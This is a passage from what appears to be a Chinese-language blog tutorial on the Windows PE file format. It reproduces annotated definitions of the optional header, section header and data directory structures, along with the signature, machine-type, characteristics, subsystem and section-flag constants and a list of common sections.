class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Optional header format.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD    Magic;<span class="comment">// 文件类型的标识，普通可执行文件：0x10B</span></span><br><span class="line">    BYTE    MajorLinkerVersion;<span class="comment">// 链接器的主版本号</span></span><br><span class="line">    BYTE    MinorLinkerVersion;<span class="comment">// 链接器的子版本号</span></span><br><span class="line">    DWORD   SizeOfCode;<span class="comment">// 按磁盘扇区的整倍数计算</span></span><br><span class="line">    DWORD   SizeOfInitializedData;<span class="comment">// 已初始化的数据块的大小</span></span><br><span class="line">    DWORD   SizeOfUninitializedData;<span class="comment">// 未初始化的数据块的大小</span></span><br><span class="line">    DWORD   AddressOfEntryPoint;<span class="comment">// 程序入口的RVA(相对虚拟地址)</span></span><br><span class="line">    DWORD   BaseOfCode;<span class="comment">// 代码段的起始RVA，一般为0x1000</span></span><br><span class="line">    DWORD   BaseOfData;<span class="comment">// 数据段的起始RVA，一般位于代码段之后</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   ImageBase;<span class="comment">// 程序的首选装载地址，Windows优先将文件装入到由ImageBase字段指定的地址中</span></span><br><span class="line">    DWORD   SectionAlignment;<span class="comment">// 内存中的区块的对齐大小</span></span><br><span class="line">    DWORD   FileAlignment;<span class="comment">// 文件中的区块的对齐大小</span></span><br><span class="line">    WORD    MajorOperatingSystemVersion;<span class="comment">// 要求操作系统最低版本号的主版本号</span></span><br><span class="line">    WORD    MinorOperatingSystemVersion;<span class="comment">// 要求操作系统最低版本号的子版本号</span></span><br><span class="line">    WORD    MajorImageVersion;<span class="comment">// 可运行于操作系统的主版本号</span></span><br><span class="line">    WORD    MinorImageVersion;<span class="comment">// 可运行于操作系统的子版本号</span></span><br><span class="line">    WORD    MajorSubsystemVersion;<span class="comment">// 要求最低子系统版本的主版本号</span></span><br><span class="line">    WORD    MinorSubsystemVersion;<span class="comment">// 要求最低子系统版本子主版本号</span></span><br><span class="line">    DWORD   Win32VersionValue;<span class="comment">// 保留值，必须为0</span></span><br><span class="line">    DWORD   SizeOfImage;<span class="comment">// 映像装入内存后的总尺寸</span></span><br><span class="line">    DWORD   SizeOfHeaders;<span class="comment">// 所有头(DOS头、PE头) + 区块表的尺寸大小</span></span><br><span class="line">    DWORD   CheckSum;<span class="comment">// 映像文件的校验和</span></span><br><span class="line">    WORD    Subsystem;<span class="comment">// 可执行文件期望的子系统</span></span><br><span class="line">    WORD    DllCharacteristics;<span class="comment">// DllMain()函数何时被调用，默认为 0</span></span><br><span class="line">    DWORD   SizeOfStackReserve;<span class="comment">// 初始化时的栈大小</span></span><br><span class="line">    DWORD   SizeOfStackCommit;<span class="comment">// 初始化时实际提交的栈大小</span></span><br><span class="line">    DWORD   SizeOfHeapReserve;<span class="comment">// 初始化时保留的堆大小</span></span><br><span class="line">    DWORD   SizeOfHeapCommit;<span class="comment">// 初始化时实际提交的堆大小</span></span><br><span class="line">    DWORD   LoaderFlags;<span class="comment">// 与调试有关，默认为 0 </span></span><br><span class="line">    DWORD   NumberOfRvaAndSizes;<span class="comment">// 下边数据目录的项数，这个字段自Windows NT 发布以来一直是16</span></span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];<span class="comment">// 数据目录表</span></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">常用的三种地址：</span><br><span class="line">VA：虚拟内存地址，00000000~0FFFFFFFh，等于进程的基址+相对虚拟内存地址</span><br><span class="line">RVA：相对虚拟内存地址，记录模块相对于基址的偏移</span><br><span class="line">FOA：File Offset Address，文件偏移地址，某个位置距离文件头(MZ)的偏移</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 各种标志的值，重点关注MZ和PE00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DOS_SIGNATURE                 0x5A4D      <span class="comment">// MZ</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_OS2_SIGNATURE                 0x454E      <span class="comment">// NE</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_OS2_SIGNATURE_LE              0x454C      <span class="comment">// LE</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_VXD_SIGNATURE                 0x454C      <span class="comment">// LE</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_NT_SIGNATURE                  0x00004550  <span class="comment">// PE00</span></span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 运行平台的宏</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_TARGET_HOST       0x0001  <span class="comment">// Useful for indicating we want to interact with the host and not a WoW guest.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_I386              0x014c  <span class="comment">// Intel 386.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_R3000             0x0162  <span class="comment">// MIPS little-endian, 0x160 big-endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_R4000             0x0166  <span class="comment">// MIPS little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_R10000            0x0168  <span class="comment">// MIPS little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_WCEMIPSV2         0x0169  <span class="comment">// MIPS little-endian WCE v2</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_ALPHA             0x0184  <span class="comment">// Alpha_AXP</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_SH3               0x01a2  <span class="comment">// SH3 little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_SH3DSP            0x01a3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_SH3E              0x01a4  <span class="comment">// SH3E little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_SH4               0x01a6  <span class="comment">// SH4 little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_SH5               0x01a8  <span class="comment">// SH5</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_ARM               0x01c0  <span class="comment">// ARM Little-Endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_THUMB             0x01c2  <span class="comment">// ARM Thumb/Thumb-2 Little-Endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_ARMNT             0x01c4  <span class="comment">// ARM Thumb-2 Little-Endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_AM33              0x01d3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_POWERPC           0x01F0  <span class="comment">// IBM PowerPC Little-Endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_POWERPCFP         0x01f1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_IA64              0x0200  <span class="comment">// Intel 64</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_MIPS16            0x0266  <span class="comment">// MIPS</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_ALPHA64           0x0284  <span class="comment">// ALPHA64</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_MIPSFPU           0x0366  <span class="comment">// MIPS</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_MIPSFPU16         0x0466  <span class="comment">// MIPS</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_AXP64             IMAGE_FILE_MACHINE_ALPHA64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_TRICORE           0x0520  <span class="comment">// Infineon</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_CEF               0x0CEF</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_EBC               0x0EBC  <span class="comment">// EFI Byte Code</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_AMD64             0x8664  <span class="comment">// AMD64 (K8)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_M32R              0x9041  <span class="comment">// M32R little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_ARM64             0xAA64  <span class="comment">// ARM64 Little-Endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_CEE               0xC0EE</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 常见PE属性</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_RELOCS_STRIPPED           0x0001  <span class="comment">// Relocation info stripped from file.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_EXECUTABLE_IMAGE          0x0002  <span class="comment">// File is executable  (i.e. no unresolved external references).</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_LINE_NUMS_STRIPPED        0x0004  <span class="comment">// Line nunbers stripped from file.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_LOCAL_SYMS_STRIPPED       0x0008  <span class="comment">// Local symbols stripped from file.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_AGGRESIVE_WS_TRIM         0x0010  <span class="comment">// Aggressively trim working set</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_LARGE_ADDRESS_AWARE       0x0020  <span class="comment">// App can handle &gt;2gb addresses</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_BYTES_REVERSED_LO         0x0080  <span class="comment">// Bytes of machine word are reversed.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_32BIT_MACHINE             0x0100  <span class="comment">// 32 bit word machine.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_DEBUG_STRIPPED            0x0200  <span class="comment">// Debugging info stripped from file in .DBG file</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP   0x0400  <span class="comment">// If Image is on removable media, copy and run from the swap file.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_NET_RUN_FROM_SWAP         0x0800  <span class="comment">// If Image is on Net, copy and run from the swap file.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_SYSTEM                    0x1000  <span class="comment">// System File.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_DLL                       0x2000  <span class="comment">// File is a DLL.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_UP_SYSTEM_ONLY            0x4000  <span class="comment">// File should only be run on a UP machine</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_BYTES_REVERSED_HI         0x8000  <span class="comment">// Bytes of machine word are reversed.</span></span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可执行文件期望的子系统的值</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_UNKNOWN              0   <span class="comment">// Unknown subsystem.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_NATIVE               1   <span class="comment">// Image doesn&#x27;t require a subsystem.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_WINDOWS_GUI          2   <span class="comment">// Image runs in the Windows GUI subsystem.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_WINDOWS_CUI          3   <span class="comment">// Image runs in the Windows character subsystem.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_OS2_CUI              5   <span class="comment">// image runs in the OS/2 character subsystem.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_POSIX_CUI            7   <span class="comment">// image runs in the Posix character subsystem.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_NATIVE_WINDOWS       8   <span class="comment">// image is a native Win9x driver.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_WINDOWS_CE_GUI       9   <span class="comment">// Image runs in the Windows CE subsystem.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_EFI_APPLICATION      10  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER  11   <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER   12  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_EFI_ROM              13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_XBOX                 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_WINDOWS_BOOT_APPLICATION 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_XBOX_CODE_CATALOG    17</span></span><br></pre></td></tr></table></figure><h2 id="区段"><a href="#区段" class="headerlink" title="区段"></a>区段</h2><p>区段表：</p><p><img src="https://s1.ax1x.com/2023/07/24/pCLqBnA.png" alt="区段表"></p><p>常用区段：</p><ul><li>.text / .code：代码段</li><li>.data：可读写的数据段，存放全局变量和静态变量</li><li>.rdata：只读数据段</li><li>.idata：存放导入表信息</li><li>.edata：存放导出表信息</li><li>.rsrc：资源段</li><li>.bss：未初始化的数据</li><li>.crt：用于C++ 运行时(CRT)所添加的数据</li><li>.tls：TLS是线程局部存储器，用于支持通过_declspec(thread)声明的线程局部存储变量的数据，这包括数据的初始化值，也包括运行时所需要的额外变量</li><li>.reloc：可执行文件的基址重定位，基址重定位一般仅Dll需要的</li><li>.sdata：相对于全局指针的可被定位的 短的读写数据</li><li>.pdata：异常表,包含CPU特定的IAMGE_RUNTIME_FUNTION_ENTRY结构数组，DataDirectory中的IMAGE_DIRECTORY_ENTRY_EXCEPTION指向它.</li><li><strong>.</strong>didata：延迟装入输入数据，在非Release模式下可以找到</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 每一个区段都是这样一个结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];<span class="comment">// 区段名</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;<span class="comment">// 区段对其之前的实际大小</span></span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;<span class="comment">// 区段载入内存后的RVA，按内存页对齐</span></span><br><span class="line">    DWORD   SizeOfRawData;<span class="comment">// 磁盘中的大小，按文件页对齐</span></span><br><span class="line">    DWORD   PointerToRawData;<span class="comment">// 区段在文件中的偏移</span></span><br><span class="line">    DWORD   PointerToRelocations;<span class="comment">// 区段重定位表的偏移地址</span></span><br><span class="line">    DWORD   PointerToLinenumbers;<span class="comment">// 行号表在文件中的偏移</span></span><br><span class="line">    WORD    NumberOfRelocations;<span class="comment">// 区段重定位表的表项个数</span></span><br><span class="line">    WORD    NumberOfLinenumbers;<span class="comment">// 行号表项的数量</span></span><br><span class="line">    DWORD   Characteristics;<span class="comment">// 区段属性</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// 区段属性</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_TYPE_REG                   0x00000000  // Reserved.</span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_TYPE_DSECT                 0x00000001  // Reserved.</span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_TYPE_NOLOAD                0x00000002  // Reserved.</span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_TYPE_GROUP                 0x00000004  // Reserved.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_TYPE_NO_PAD                0x00000008  <span class="comment">// Reserved.</span></span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_TYPE_COPY                  0x00000010  // Reserved.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_CNT_CODE                   0x00000020  <span class="comment">// Section contains code.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_CNT_INITIALIZED_DATA       0x00000040  <span class="comment">// Section contains initialized data.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_CNT_UNINITIALIZED_DATA     0x00000080  <span class="comment">// Section contains uninitialized data.</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_LNK_OTHER                  0x00000100  <span class="comment">// Reserved.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_LNK_INFO                   0x00000200  <span class="comment">// Section contains comments or some other type of information.</span></span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_TYPE_OVER                  0x00000400  // Reserved.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_LNK_REMOVE                 0x00000800  <span class="comment">// Section contents will not become part of image.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_LNK_COMDAT                 0x00001000  <span class="comment">// Section contents comdat.</span></span></span><br><span class="line"><span class="comment">//                                           0x00002000  // Reserved.</span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_MEM_PROTECTED - Obsolete   0x00004000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_NO_DEFER_SPEC_EXC          0x00004000  <span class="comment">// Reset speculative exceptions handling bits in the TLB entries for this section.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_GPREL                      0x00008000  <span class="comment">// Section content can be accessed relative to GP</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_FARDATA                0x00008000</span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_MEM_SYSHEAP  - Obsolete    0x00010000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_PURGEABLE              0x00020000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_16BIT                  0x00020000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_LOCKED                 0x00040000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_PRELOAD                0x00080000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_1BYTES               0x00100000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_2BYTES               0x00200000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_4BYTES               0x00300000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_8BYTES               0x00400000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_16BYTES              0x00500000  <span class="comment">// Default alignment if no others are specified.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_32BYTES              0x00600000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_64BYTES              0x00700000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_128BYTES             0x00800000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_256BYTES             0x00900000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_512BYTES             0x00A00000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_1024BYTES            0x00B00000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_2048BYTES            0x00C00000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_4096BYTES            0x00D00000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_8192BYTES            0x00E00000  <span class="comment">//</span></span></span><br><span class="line"><span class="comment">// Unused                                    0x00F00000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_MASK                 0x00F00000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_LNK_NRELOC_OVFL            0x01000000  <span class="comment">// Section contains extended relocations.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_DISCARDABLE            0x02000000  <span class="comment">// Section can be discarded.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_NOT_CACHED             0x04000000  <span class="comment">// Section is not cachable.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_NOT_PAGED              0x08000000  <span class="comment">// Section is not pageable.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_SHARED                 0x10000000  <span class="comment">// Section is shareable.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_EXECUTE                0x20000000  <span class="comment">// Section is executable.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_READ                   0x40000000  <span class="comment">// Section is readable.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_WRITE                  0x80000000  <span class="comment">// Section is writeable.</span></span></span><br></pre></td></tr></table></figure><h2 id="数据目录表"><a href="#数据目录表" class="headerlink" title="数据目录表"></a>数据目录表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;<span class="comment">// 虚拟地址</span></span><br><span class="line">    DWORD   Size;<span class="comment">// 尺寸</span></span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 